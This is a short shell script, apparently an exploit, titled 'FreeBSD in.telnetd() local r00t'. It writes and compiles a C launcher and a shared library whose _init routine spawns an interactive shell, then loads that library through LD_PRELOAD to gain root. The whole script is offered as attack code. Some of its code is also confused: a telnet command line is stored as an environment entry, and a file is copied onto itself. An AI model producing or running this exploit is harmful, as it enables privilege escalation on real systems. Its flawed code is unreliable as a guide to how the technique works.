#!/bin/sh
echo * FreeBSD in.telnetd() local r00t
cat > en.c << _EOF
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
main() {
extern char **environ;
environ = (char**)malloc(8096);
environ[0] = (char*)malloc(1024);
environ[1] = (char*)malloc(1024);
strcpy(environ[0], "LD_PRELOAD=libno_ex.so.1.0");
strcpy(environ[1], "telnet localhost && auth disable SRA");
execl("/bin/sh", "/bin/sh", NULL);
}
_EOF
gcc en.c -o en
cat > pr.c << _EOF
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
FILE *f;
setenv("LD_PRELOAD", "libno_ex.so.1.0", 1);
execl("/bin/sh", "sh", "-i", NULL);
}
_EOF
gcc -o pr.o -c pr.c -fPIC
gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 pr.o -nostartfiles
cp libno_ex.so.1.0 libno_ex.so.1.0
./en
